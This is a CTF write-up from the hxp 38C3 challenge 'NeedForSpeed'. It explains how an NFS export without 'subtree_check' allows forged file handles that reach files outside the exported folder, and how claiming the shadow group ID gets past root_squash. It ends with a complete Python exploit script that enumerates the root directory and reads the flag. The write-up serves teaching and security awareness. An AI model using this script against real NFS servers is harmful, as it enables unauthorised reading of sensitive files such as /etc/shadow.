---
title: "NeedForSpeed - hxp 38C3 CTF"
category: "web"
subcategory: "network"
type: "writeup"
tags: ["web", "wireshark", "needforspeed", "network", "hxp-38c3-ctf", "ctf-writeup"]
summary: "Sun, 29 December 2024 ~ philipp-tg, edermi, sandr0"
source:
  name: "CTFtime writeup #39733"
  url: "https://ctftime.org/writeup/39733"
original_source: "https://hxp.io/blog/111/hxp-38C3-CTF-NeedForSpeed/"
ctf:
  name: "hxp 38C3 CTF"
  challenge: "NeedForSpeed"
---

## Metadata

- **CTF:** hxp 38C3 CTF
- **Task:** NeedForSpeed
- **Author team:** hxp
- **CTFtime:** <https://ctftime.org/writeup/39733>
- **Original writeup:** <https://hxp.io/blog/111/hxp-38C3-CTF-NeedForSpeed/>

---
Sun, 29 December 2024 ~ philipp-tg, edermi, sandr0

## hxp 38C3 CTF: NeedForSpeed

MSC (667 points, 6 solves)

Here we explain the intended solution for the misc challenge [NeedForSpeed](https://2024.ctf.link/internal/challenge/b964e61c-5d98-41b9-9f3a-1bb129e6ce24/) from our recent CTF.

The challenge focuses on unsecure default behavior when not explicitly setting `no_subtree_check`.

### Acknowledgement

hxp thanks [philipp-tg](https://github.com/philipp-tg) and [edermi](https://github.com/edermi) for contributing this challenge. Read more about NFS on their [blogpost](https://www.hvs-consulting.de/en/nfs-security-identifying-and-exploiting-misconfigurations/).

### Description

NFS memes on NFS 🏎️💨

### Memes

First, let’s get the memes.

This can be done by mounting the NFS using:

```
    mkdir mnt
    sudo mount -t nfs <ip>:/ mnt/
```

In case your UID is not 1337, you can still not access the files. You have to first either set your own UID to 1337, or use a NFS client which does that for you. I hope you enjoyed the memes and they reminded you times when NFS stood for something.

### What’s going on?

Let’s first look at the Dockerfile what’s going on.

The challenge sets up a VM using a default Debian 12 cloud image with the following cloud-init configuration (only important parts):

```
    # install nfs server
    apt install -y nfs-kernel-server
    # create user with user id 1337
    useradd ctf -u 1337
    
    # memes are owned by ctf user
    chown -R ctf:ctf /memes
    
    # flag is owned by root user
    chown -R root:shadow /flag.txt
    
    # set memes and flag to be accessible via user and group
    chmod 0440 /memes/* /flag.txt
    
    # write nfs export config: export folder /memes read only to everybody
    echo "/memes *(ro)" > /etc/exports
    # reload exports
    exportfs -ra
```

When starting the VM, exportfs prints the following warning message:

```
    exportfs: /etc/exports [1]: Neither 'subtree_check' or 'no_subtree_check' specified for export "*:/memes".
      Assuming default behaviour ('no_subtree_check').
      NOTE: this default has changed since nfs-utils version 1.0.x
```

Now you normally would expect that the default is sane.

Let’s ask the man page [[2](https://linux.die.net/man/5/exports)] about the feature in question:

```
    no_subtree_check
        This option disables subtree checking, which has mild security implications, but can improve reliability in some circumstances.
    
        [...]
    
        From release 1.1.0 of nfs-utils onwards, the default will be no_subtree_check as subtree_checking tends to cause more problems than it is worth. [...]
```

### “Mild security implications”

The main question arises: What can we actually do?

Either by dumping the mounting process with Wireshark, or by reading up on how the NFS protocol works, we get an idea of the protocol.

NFS works exclusively with file handles. A file handle consists of the root file handle (get when mounting) and a file specific handle (4 byte inode, 4 byte generation).

In theory, these 8 file specific bytes should be unguessable, leaving flag.txt to be still safe.

Actually, the generation does not matter can you can just send 0-bytes, and locally the flag gets inode number `a0720000`. Just reading the flag then works. You’re done. Congratz.

Except, one additional caveat:

The flag is owned by `root:shadow` and per default it’s not possible to access files owned by root as `root_squash` [[2](https://linux.die.net/man/5/exports)] is enabled by default.

```
    root_squash
        Map requests from uid/gid 0 to the anonymous uid/gid. Note that this does not apply to any other uids or gids that might be equally sensitive, such as user bin or group staff.
```

Luckily, `shadow` is not `root` and we can just read the flag by sending authentication with GID 42.

### For completeness, let’s do it the correct way without guessing the inode

Root `/` has fixed inode 2 and generation 0 [[3](https://docs.kernel.org/filesystems/ext4/overview.html#special-inodes)].

Using the NFS3 function readdirplus [[1](https://www.freesoft.org/CIE/RFC/1813/37.htm)], with the root file handle and the known file handle for `/`, we can get all file handles of all files and folders under `/`.

This way we get the actual file handle for `flag.txt` and can therefore just read the file using the default NFS read instruction.

Which gives you the flag:

`hxp{Y3s_y0u_can_4lso_r34d_/etc/shadow!_Th1s_i5_f1n3!}`

(although reading `/etc/shadow` is not possible in this example, but we have seen it in the wild several times)

Solve script using pyNfsClient [[4](https://github.com/CharmingYang0/NfsClient)] with some NFS4 added manually for the challenge:

```
    #!/usr/bin/env python3
    
    from pyNfsClient import (NFSv3, NFS_PROGRAM, RPC)
    
    import binascii
    import sys
    from xdrlib import Packer
    
    PROCEDURE_COMPOUND = 1
    OP_PUTFH = 22
    OP_LOOKUP = 15
    OP_GETATTR = 9
    OP_GETFH = 10
    OP_READDIR = 26
    
    class NFSv4Packer(Packer):
    
        def __init__(self):
            super().__init__()
            # tag
            self.pack_int(0)
            # minorversion
            self.pack_int(0)
    
        def pack_mask(self):
            # attr mask amount
            self.pack_int(2)
            # attr mask 0
            self.pack_int(0x00100012)
            # attr mask 1
            self.pack_int(0x0030a03a)
    
        def pack_readdir(self):
            self.pack_int(OP_READDIR)
            self.pack_int(0) # cookie
            self.pack_int(0) # cookie
            self.pack_int(0) # cookie_ver
            self.pack_int(0) # cookie_ver
            self.pack_int(8192) # dircount
            self.pack_int(8192) # maxcount
            self.pack_mask()
    
    
    class NFSv4(RPC):
    
        def __init__(self, host, port, timeout, auth):
            super(NFSv4, self).__init__(host=host, port=port, timeout=timeout)
            self.auth = auth
    
        def nfs_request(self, procedure, args, auth):
            return super(NFSv4, self).request(NFS_PROGRAM, 4, procedure, data=args, auth=auth)
    
        def lookup(self, folder):
            packer = NFSv4Packer()
            # operation count
            packer.pack_int(5)
    
            packer.pack_int(OP_PUTFH)
            # this is a static root file handle
            packer.pack_bytes(b"\x01\x00\x01\x00\x00\x00\x00\x00")
    
            packer.pack_int(OP_LOOKUP)
            # 0-byte is padding
            packer.pack_bytes(folder)
    
            packer.pack_int(OP_GETATTR)
            packer.pack_mask()
    
            packer.pack_int(OP_GETFH)
    
            packer.pack_readdir()
    
            return self.nfs_request(PROCEDURE_COMPOUND, packer.get_buffer(), auth=self.auth)
    
    def main(host, port):
        auth = {
            "flavor": 1,
            "machine_name": "machine",
            "uid": 1337,  # ctf
            "gid": 42,  # shadow
            "aux_gid": list(),
        }
    
        nfs4 = NFSv4(host, port, 3600, auth=auth)
        nfs4.connect()
    
        memes_folder = nfs4.lookup(b"memes")
        print(memes_folder)
        # NFS4_OK
        assert memes_folder[0:4] == b"\x00\x00\x00\x00"
    
        fh_len = int.from_bytes(memes_folder[148:152], byteorder="big")
        root_fh = memes_folder[152:152+fh_len]
        print("ROOTFH", binascii.hexlify(root_fh))
    
        # sanity check
        assert root_fh[:4] == b"\x01\x00\x07\x00"
    
        # patch fb_fileid_type to be able to read files
        root_fh = root_fh[:3] + b"\x01" + root_fh[4:]
    
        # switch to NFS3 for readdirplus, this is properly implemented
        nfs3 = NFSv3(host, port, 3600, auth)
        nfs3.connect()
    
        #                                 Inode /               Generation /
        root = nfs3.readdirplus(root_fh + b"\x02\x00\x00\x00" + b"\x00\x00\x00\x00")
    
        if not root["resok"]:
            print("ERROR", root["resfail"])
            return False
    
        entry = root["resok"]["reply"]["entries"][0]
    
        flag_fh = None
        # iterate through root directory
        print("/")
        while True:
            name = entry["name"]
            handle = entry["name_handle"]["handle"]
            if handle:
                handle = handle["data"]
                if name == b"flag.txt":
                    flag_fh = handle
                handle = handle.hex()
            print(f"/{name.decode()} - {handle}")
    
            # break if last file reached
            entries = entry["nextentry"]
            if not entries:
                break
            entry = entries[0]
    
        if not flag_fh:
            print("ERROR: flag not found")
            return False
    
        res = nfs3.read(flag_fh)
        if not res["resok"]:
            print(res["resfail"])
            return False
    
        print()
        print("Flag:", res["resok"]["data"].decode())
        return True
    
    
    if __name__ == "__main__":
        main(sys.argv[1], int(sys.argv[2]))
```
